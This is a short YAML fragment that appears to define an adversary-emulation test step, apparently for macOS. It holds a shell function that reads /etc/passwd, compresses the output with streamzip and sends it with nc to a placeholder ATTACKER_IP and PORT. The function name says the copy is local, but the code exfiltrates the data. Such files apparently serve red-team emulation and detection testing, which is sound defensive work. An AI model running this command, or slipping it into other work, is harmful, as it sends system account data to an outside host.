    execute_function:
    - execute_copy_compress_sensitive_data_locally
  global_variable:
  - name: CMD_STREAMZIP
    type: string
    default_value: /usr/bin/streamzip
  functions:
  - name: execute_copy_compress_sensitive_data_locally
    type: main
    language:
    - shell
    opsec:
      check_fda:
        enabled: false
        exit_on_failure: true
    code: "execute_copy_compress_sensitive_data_locally() {\n    local result\n    result=$(dd if=/etc/passwd | streamzip\
      \ - stream | nc ATTACKER_IP PORT 2>&1)\n    $CMD_PRINTF \"RESULT|%s\\n\" \"$result\"\n    return 0\n}"
